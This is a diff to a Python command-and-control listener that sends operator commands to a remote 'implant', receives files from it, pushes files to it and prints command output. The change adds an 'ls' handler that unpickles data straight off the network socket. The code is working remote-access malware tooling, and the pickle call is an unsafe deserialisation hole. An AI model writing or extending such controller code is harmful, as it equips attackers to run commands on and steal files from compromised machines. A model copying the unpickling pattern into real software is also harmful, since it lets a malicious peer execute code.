@@ -1,13 +1,12 @@
 import socket
-import threading
-import time
+import pickle
 
 
-ip,port = '127.0.0.1', 4001
+ip, port = '127.0.0.1', 4001
 
-with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((ip, port))
-    s.listen()
+    s.listen(1)
     conn, addr = s.accept()
     with conn:
         data = conn.recv(1024).decode()
@@ -17,7 +16,7 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
         while True:
             cmd = input("Send command to implant: ")
             if cmd.split()[0] == 'upload':
-                with open('retrieved_'+ cmd.split()[1], 'wb') as f:
+                with open('retrieved_' + cmd.split()[1], 'wb') as f:
                     # print('file opened')
                     conn.send(cmd.encode())
                     while True:
@@ -42,7 +41,11 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                         break
                 file.close()
                 conn.send("ENDOFFILE".encode())
-
+            elif cmd.split()[0] == "ls":
+                conn.send(cmd.encode())
+                data = pickle.loads(conn.recv(32768))
+                for entry in data:
+                    print(entry)
             else:
                 conn.send(cmd.encode())
                 data = conn.recv(32768).decode()
